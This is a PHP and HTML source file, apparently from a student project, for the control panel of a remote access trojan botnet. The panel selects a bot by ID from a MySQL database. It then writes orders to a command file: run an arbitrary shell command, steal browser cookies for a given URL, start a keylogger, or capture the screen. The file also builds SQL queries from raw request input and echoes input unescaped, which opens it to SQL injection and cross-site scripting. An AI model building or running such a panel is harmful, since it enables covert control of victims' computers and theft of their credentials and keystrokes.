<?php
$ID = "All";
$ip = "All";
$port = "All";
$bot = 'no bot';
if ((isset($_GET['ID']) && !empty($_GET['ID']))) {
    $ID = $_GET['ID'];
    $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
    mysqli_select_db($link, "pbl4_v2");
    $sql = "SELECT * FROM bot WHERE Id='$ID'";
    $result = mysqli_query($link, $sql);

    while ($row = mysqli_fetch_array($result)) {
        $ip = $row['Ip'];
        $port = $row['Port'];
        $status = $row['Status'];
    }
} else if ((isset($_POST['ID']) && !empty($_POST['ID']))) {
    $ID = $_POST['ID'];
    $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
    mysqli_select_db($link, "pbl4_v2");
    $sql = "SELECT * FROM bot WHERE Id='$ID'";
    $result = mysqli_query($link, $sql);

    while ($row = mysqli_fetch_array($result)) {
        $ip = $row['Ip'];
        $port = $row['Port'];
        $status = $row['Status'];
    }
}




$fp = fopen('botActive.txt', 'w');
fwrite($fp, $ID);
fwrite($fp, '&');
fwrite($fp, $ip);
fwrite($fp, '&');
fwrite($fp, $port);
fclose($fp);
?>

<!-- <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Open Bot</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            background-color: #87ceeb;
            padding: 20px;

        }

        button {
            padding: 10px;
        }
    </style>
</head>

<body>
    <div id="command-form">
        <img src="serverIcon.png" alt="" width="180vw">
        <h2>BOT RAT Administration Page</h2>
        <form method="post" action="openBot.php?ID=" id="cmdform">
            RAT BOT IP: <input type="text" name="ip" readonly value="" />
           
            <br><br>
            RAT BOT PORT: <input type="text" name="port" readonly value="" />
            <p>Please enter your command: </p>
            <input type="text" name="cmdstr" size="35%">
            <p><input type="submit" name="buttonCmd" value="Execute Cmd"></p>
            <p><input type="submit" name="buttonCookie" value="Execute Cookie"></p>
            <p><input type="submit" name="buttonKeylogger" value="Execute Keylogger"></p>
            <p><input type="submit" name="buttonCapture" value="Execute Capture"></p>
            <p><a href='index.php'>Back to Main</a></p>
        </form>
    </div>
</body>

</html> -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <!-- <link rel="stylesheet" type="text/css" href="../css/copy.css" /> -->
    <!-- <link rel="stylesheet" type="text/css" href="../css/openBot.css" /> -->
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <title>Open Bot</title>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        body {
            /* background-image: url("../img/botactive.png"); */
            background: url("https://geekprank.com/hacker/green-back.jpg") no-repeat center center #000;
            color: #0f0;
            text-shadow: 0px 0px 10px #0f0;
            line-height: 21px;
            font-size: 15px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            max-width: 100%;
            max-height: 100%;
            overflow: hidden;
        }

        .inputCommand {
            border: 4px solid rgb(75, 194, 75);
            background: black;
            border-radius: 5px;
            justify-content: center;
        }

        /* Header */
        .header {
            width: 100%;
            height: 30px;
            background-color: #00ff00;
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            /* margin-bottom: 50px; */
        }

        .ul_header {
            list-style: none;
        }

        .li_header {
            display: inline-block;
        }

        .ul_header,
        .li_header {
            margin: 0;
            padding: 0;
        }

        .label_header {
            color: black;
            font-weight: 600;
            padding-left: 10px;
            padding-top: 3px;
            font-size: 20px;
        }

        .li_header_icon {
            padding: 5px 8px;
        }

        a {
            text-decoration: none;
        }

        .container {
            display: flex;
            width: 100vw;
            height: 100vh;
            padding: 30px;
            column-gap: 40px;
        }

        .inputCommand {
            width: 80%;
        }


        .content {
            width: 100%;
            min-height: 90%;
            padding: 30px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .content_table {
            width: 100%;
            text-align: center;
            border: 1px solid #00ff00;
        }

        .content_table {
            width: 100%;
            text-align: center;
            border: 1px solid #00ff00;
        }

        .content_table-thead {
            background: #62fa62;
            color: black;
            text-transform: uppercase;
        }

        .content_table-tr {
            font-weight: bold;
            border: 1px solid #00ff00;
        }

        .content_table-td {
            font-weight: bold;
            border: 1px solid #00ff00;
            max-width: 300px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .content_table-th {
            padding: 4px 0px;
        }

        .content_form {
            width: 35%;
            height: 100%;
        }

        .content_element {
            width: 100%;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .content_element-label {
            font-size: 16px;
            min-width: 120px;
        }

        .content_element-input {
            width: 100%;
            padding: 4px 6px;
            background: transparent;
            color: #00ff00;
            border: 1px solid #00ff00;
            outline: none;
            border-radius: 4px;
        }

        .content_button {
            width: 100%;
            margin: 20px 0px;
            display: flex;
            justify-content: space-between;
        }

        .content_button-el {
            padding: 4px 8px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            font-weight: 500;
            background: #00ff00;
            outline: none;
            cursor: pointer;
        }

        .content_back {
            margin-top: 16px;
            color: #00ff00;
            border: none;
            outline: none;
            font-size: 16px;
            text-decoration: underline;
            background: transparent;
            cursor: pointer;
            align-self: flex-start;
        }

        .content-container {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            column-gap: 100px;
        }

        .content_ins {
            flex: 1;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="inputCommand">
            <div class="header">
                <ul class="ul_header">
                    <li class="li_header label_header">
                        <label for="">Control Bot</label>
                    </li>
                </ul>
                <ul class="ul_header">
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-minus" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-regular fa-square" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-x" style="color: black; text-shadow: none"></i>
                    </li>
                </ul>
            </div>
            <div class="content">
                <div class="content-container">


                    <form class="content_form" method="post" action="openBot.php<?php
                                                                                if ($ID != "All") {
                                                                                    echo '?ID=' . $ID . '';
                                                                                }
                                                                                ?>" id="cmdform">
                        <div class="content_element">
                            <label class="content_element-label" for="ip">IP:</label>
                            <input class="content_element-input" id="ip" type="text" name="ip" readonly value="<?php echo $ip ?>" />
                        </div>
                        <div class="content_element">
                            <label class="content_element-label" for="port">PORT:</label>
                            <input class="content_element-input" id="port" type="text" name="port" readonly value="<?php echo $port; ?>" />
                        </div>
                        <div style="margin-top:20px ;">
                            <label class="content_element-label" style="display: block; text-align:center; margin-bottom: 8px; text-transform: uppercase; font-size:16px;" for="command">Enter command:</label>
                            <input class="content_element-input" id="command" type="text" name="cmdstr" />
                        </div>
                        <!-- <p class="content_element-label" style="width:100%;">Enter command: </p>
                    <input class="content_element-input" type="text" name="cmdstr" > -->
                        <div class="content_button">
                            <p><input class=" content_button-el" type="submit" name="buttonCmd" value="Cmd"></p>
                            <p><input class=" content_button-el" type="submit" name="buttonCookie" value="Cookie"></p>
                            <p><input class=" content_button-el" type="submit" name="buttonKeylogger" value="Keylogger"></p>
                            <p><input class=" content_button-el" type="submit" name="buttonCapture" value="Capture"></p>
                        </div>

                    </form>
                    <div class="content_ins">
                        <table class="content_table">
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get cmd</td>
                                <td class="content_table-td">Enter cmd<br> Click Cmd button</td>
                            </tr>
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get cookie</td>
                                <td class="content_table-td">Enter url<br> Click Cookie button</td>
                            </tr>
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get keylogger</td>
                                <td class="content_table-td">Click Cmd button</td>
                            </tr>
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get capture</td>
                                <td class="content_table-td">Click Capture button</td>
                            </tr>
                        </table>
                    </div>
                </div>
                <button class="content_back" onclick="history.back()">Go Back</button>
            </div>
        </div>
      <?php 
      include_once("navigate.php");
      ?>
    </div>
</body>

</html>

<?php
if (isset($_POST['buttonCmd'])) {

    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received cmd: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcmd");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonCookie'])) {

    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received link get cookies: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcookie");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonKeylogger'])) {

    $temp = "abc";
    echo 'Request keylogger <br>';
    $fp = fopen('commandBot.txt', 'w');
    fwrite($fp, "getkeylogger");
    fwrite($fp, '&');
    fwrite($fp, $temp);
    fclose($fp);
} else if (isset($_POST['buttonCapture'])) {


    echo 'Request Capture <br>';
    $fp = fopen('commandBot.txt', 'w');
    fwrite($fp, "getcapture");
    fwrite($fp, '&');
    fwrite($fp, "aaaa");
    fclose($fp);
}
?>